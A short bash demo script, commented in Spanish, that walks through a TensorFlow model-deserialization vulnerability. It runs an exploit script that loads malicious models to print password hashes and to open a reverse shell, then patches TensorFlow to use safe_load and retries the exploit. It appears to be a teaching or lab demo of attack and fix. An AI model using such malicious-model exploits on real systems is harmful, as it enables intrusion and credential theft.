#!/bin/bash -x

echo -e 'Ejemplo feliz de carga de un modelo de ML de ejemplo\n\n'
python CreateExampleModel.py
python ExploitTensorflowDeserialization.py exampleModel

echo -e 'Explotación de vulnerabilidad cargando un modelo malicioso para mostrar hashes de passwords\n\n'
python ExploitTensorflowDeserialization.py printPasswdFile

echo -e '\n\nExplotación de vulnerabilidad con reverse shell\n\n'
python ExploitTensorflowDeserialization.py reverseShell

echo -e '\n\nAplicación de la contramedida. Reemplazo unsafe_load por safe_load en Tensorflow\n\n'
cp model_config.py /usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/model_config.py

echo -e 'Vuelvo a tratar de explotar la vulnerabilidad después de la contramedida, mostrando passwords\n\n'
python ExploitTensorflowDeserialization.py printPasswdFile